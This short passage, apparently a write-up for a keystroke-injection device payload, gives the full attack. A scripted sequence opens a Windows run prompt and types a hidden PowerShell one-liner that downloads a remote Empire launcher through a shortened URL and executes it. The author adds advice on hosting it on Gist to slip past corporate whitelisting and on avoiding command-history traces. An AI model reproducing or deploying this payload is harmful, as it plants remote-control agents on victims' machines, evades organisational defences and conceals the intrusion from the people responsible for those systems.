Payload will execute the Empire Powershell launcher, which usually I host on Gist and then use google shortener to shorten the URL.

Most corporate environments are whitelisting both gist.github.com and google, so it is easy to deploy an agent in this way. (of course this payload will leave the command `powershell -W Hidden -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring('https://goo.gl/XXXXX')"` into the cmd history. But you just need to execute it in a cmd to avoid it (no history, but takes more time to type).

Delay
Delay
Delay
Press:131+114
PrintLine:cmd
PrintLine:powershell -W Hidden -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring('https://goo.gl/xxxxx')"